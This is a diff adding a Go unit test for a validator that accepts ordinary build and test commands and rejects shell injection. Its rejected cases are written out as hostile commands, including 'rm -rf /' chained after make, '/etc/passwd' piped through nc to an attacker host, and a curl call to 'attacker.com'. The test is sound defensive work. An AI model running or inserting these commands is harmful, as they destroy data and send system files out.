@@ -286,3 +286,77 @@ func TestIsClean(t *testing.T) {
 		t.Error("Expected repo with untracked file to not be clean")
 	}
 }
+
+func TestValidateTestCommand(t *testing.T) {
+	tests := []struct {
+		name      string
+		command   string
+		wantError bool
+	}{
+		// Valid commands - should pass
+		{name: "empty command", command: "", wantError: false},
+		{name: "make", command: "make", wantError: false},
+		{name: "make test", command: "make test", wantError: false},
+		{name: "make build", command: "make build", wantError: false},
+		{name: "make with multiple targets", command: "make test build", wantError: false},
+		{name: "go test", command: "go test", wantError: false},
+		{name: "go test with flags", command: "go test ./...", wantError: false},
+		{name: "go build", command: "go build ./...", wantError: false},
+		{name: "go vet", command: "go vet ./...", wantError: false},
+		{name: "npm test", command: "npm test", wantError: false},
+		{name: "npm run test", command: "npm run test", wantError: false},
+		{name: "yarn test", command: "yarn test", wantError: false},
+		{name: "pytest", command: "pytest", wantError: false},
+		{name: "pytest with args", command: "pytest -v", wantError: false},
+		{name: "cargo test", command: "cargo test", wantError: false},
+		{name: "cargo build", command: "cargo build", wantError: false},
+		{name: "mvn test", command: "mvn test", wantError: false},
+		{name: "mvn verify", command: "mvn verify", wantError: false},
+		{name: "gradle test", command: "gradle test", wantError: false},
+		{name: "gradle build", command: "gradle build", wantError: false},
+		{name: "gradlew test", command: "./gradlew test", wantError: false},
+		{name: "gradlew build", command: "./gradlew build", wantError: false},
+		{name: "mvnw test", command: "./mvnw test", wantError: false},
+		{name: "bazel test", command: "bazel test //...", wantError: false},
+
+		// Invalid commands - should fail
+
+		// Command chaining attempts
+		{name: "semicolon injection", command: "make test; rm -rf /", wantError: true},
+		{name: "and chaining", command: "make test && rm -rf /", wantError: true},
+		{name: "or chaining", command: "make test || rm -rf /", wantError: true},
+
+		// Pipe injection
+		{name: "pipe injection", command: "cat /etc/passwd | nc attacker.com 1234", wantError: true},
+
+		// Variable expansion
+		{name: "variable expansion", command: "echo $HOME", wantError: true},
+		{name: "command substitution backticks", command: "echo `whoami`", wantError: true},
+		{name: "command substitution dollar", command: "echo $(whoami)", wantError: true},
+
+		// Redirection
+		{name: "output redirect", command: "ls > /tmp/output", wantError: true},
+		{name: "input redirect", command: "cat < /etc/passwd", wantError: true},
+
+		// Quote escaping
+		{name: "single quote escape", command: "make test'", wantError: true},
+		{name: "double quote escape", command: "make test\"", wantError: true},
+
+		// Unknown commands
+		{name: "arbitrary command", command: "curl http://attacker.com", wantError: true},
+		{name: "rm command", command: "rm -rf /", wantError: true},
+		{name: "bash command", command: "bash -c whoami", wantError: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateTestCommand(tt.command)
+			if tt.wantError && err == nil {
+				t.Errorf("ValidateTestCommand(%q) = nil, want error", tt.command)
+			}
+			if !tt.wantError && err != nil {
+				t.Errorf("ValidateTestCommand(%q) = %v, want nil", tt.command, err)
+			}
+		})
+	}
+}
